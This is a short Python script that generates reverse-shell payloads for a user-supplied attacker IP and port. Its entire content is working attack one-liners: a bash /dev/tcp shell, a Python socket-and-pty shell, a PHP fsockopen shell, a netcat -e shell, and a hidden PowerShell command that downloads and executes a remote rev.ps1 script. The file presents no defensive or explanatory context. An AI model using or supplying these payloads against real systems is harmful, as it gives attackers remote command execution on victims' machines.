#!/usr/bin/env python3

ip = input("Attacker IP: ")
port = input("Port: ")

print("\n[*] Bash Shell:")
print(f"bash -i >& /dev/tcp/{ip}/{port} 0>&1")

print("\n[*] Python Shell:")
print(f"python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'")

print("\n[*] PHP Shell:")
print(f"php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'")

print("\n[*] Netcat:")
print(f"nc -e /bin/sh {ip} {port}")

print("\n[*] PowerShell:")
print(f'powershell -NoP -NonI -W Hidden -Exec Bypass -Command "Invoke-Expression(New-Object Net.WebClient).DownloadString(\'http://{ip}/rev.ps1\')"')
